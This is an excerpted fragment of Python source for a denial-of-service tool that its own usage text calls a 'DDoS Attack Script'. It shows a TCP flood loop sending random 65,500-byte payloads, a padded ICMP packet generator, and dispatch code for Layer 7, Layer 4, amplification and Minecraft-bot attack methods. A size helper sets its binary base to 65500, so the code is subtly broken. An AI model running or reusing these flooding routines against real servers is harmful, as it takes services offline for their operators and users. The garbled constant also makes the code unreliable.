...
class Tools:
    ...
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        ...
        if i > 0:
            base = 65500 if binary else 1000
...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(65500)):
                continue
        Tools.safe_close(s)
    ...
    def _genrate_icmp(self) -> bytes:
        ...
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 65500)))
        ip.contains(icmp)
        return ip.get_packet()
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* Crown_ENIONS - DDoS Attack Script With %d Methods\n'
    ...
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if method == "BOMB":
                    assert (
                        ...
                        "Install bombardier: "
                        "https://github.com/Crown_ENIONS/Crown_ENIONS/wiki/BOMB-method"
                    )
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if bytes > 65535 or bytes < 1:
                   exit("Invalid bytes [Min: 1 / Max: 65535] ")
                ...
                if method in Methods.LAYER4_AMP:
                    ...
                    logger.warning("https://github.com/Crown_ENIONS/Crown_ENIONS/wiki/Amplification-ddos-attack")
                ...
                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        ...
                        protocolid = Tools.protocolRex.search(str(s.recv(65500)))
